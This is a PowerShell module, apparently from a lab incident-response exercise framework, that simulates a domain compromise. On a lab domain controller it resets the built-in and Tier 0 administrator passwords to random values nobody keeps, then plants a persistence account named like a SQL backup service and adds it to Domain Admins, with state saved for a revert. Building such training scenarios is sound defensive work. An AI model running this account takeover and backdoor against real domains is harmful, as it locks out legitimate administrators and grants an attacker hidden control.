<#
.SYNOPSIS
    admin-passwords-changed: resets the built-in Administrator and every
    Tier 0 administrator's -a account to random passwords nobody keeps, and adds
    an innocuous-looking account to Domain Admins.
.DESCRIPTION
    CERT keeps working through its second lab credential (svc-labdeploy), and
    the revert puts every password back.
#>
param([Parameter(Mandatory)] $Context)

$inv = $Context.Lab.Inventory
$suffix = [string] $inv.identity.administrative_model.account_suffix
$admins = @($inv.identity.administrative_model.administrators | Where-Object { [int] $_.tier -eq 0 } | ForEach-Object { "$($_.username)$suffix" })
# Never reset: CERT's fallback account, the engagement account, and the account
# running CERT (resetting it locked the person running the scenario out).
$skip = @('svc-labdeploy', ($Context.Run.engagement.account -split '\\')[-1], ([string] $Context.Run.owner -split '\\')[-1]) | Where-Object { $_ }

$r = Invoke-CertTarget -Context $Context -Instance $Context.Targets.dc -ArgumentList $admins, $skip -ScriptBlock {
    param($Admins, $Skip)
    Import-Module ActiveDirectory
    function New-Junk { -join ((1..32) | ForEach-Object { [char] (Get-Random -Minimum 33 -Maximum 126) }) + 'aA1!' }
    $before = @(Get-ADGroupMember -Identity 'Domain Admins' -Recursive | ForEach-Object SamAccountName)
    $sid500 = "$((Get-ADDomain).DomainSID.Value)-500"
    $builtin = (Get-ADUser -Identity $sid500).SamAccountName
    $changed = @()
    foreach ($a in @($builtin) + $Admins) {
        if ($Skip -contains $a) { continue }
        if (-not (Get-ADUser -Filter "SamAccountName -eq '$a'")) { continue }
        Set-ADAccountPassword -Identity $a -Reset -NewPassword (ConvertTo-SecureString (New-Junk) -AsPlainText -Force)
        $changed += $a
    }
    # Persistence: in the default Users container, named like a service account.
    $rogue = 'svc-sqlbackup'
    New-ADUser -Name $rogue -SamAccountName $rogue -Path (Get-ADDomain).UsersContainer -Enabled $true `
        -AccountPassword (ConvertTo-SecureString (New-Junk) -AsPlainText -Force) -PasswordNeverExpires $true `
        -Description 'SQL backup service'
    Add-ADGroupMember -Identity 'Domain Admins' -Members $rogue
    [pscustomobject]@{ Changed = $changed; Rogue = $rogue; Before = $before; At = (Get-Date).ToUniversalTime().ToString('o') }
}
Save-CertModuleState -Context $Context -State @{ changed = @($r.Changed); rogue = $r.Rogue; domain_admins_before = @($r.Before); at = $r.At }
"reset $(@($r.Changed).Count) account(s); added $($r.Rogue)"
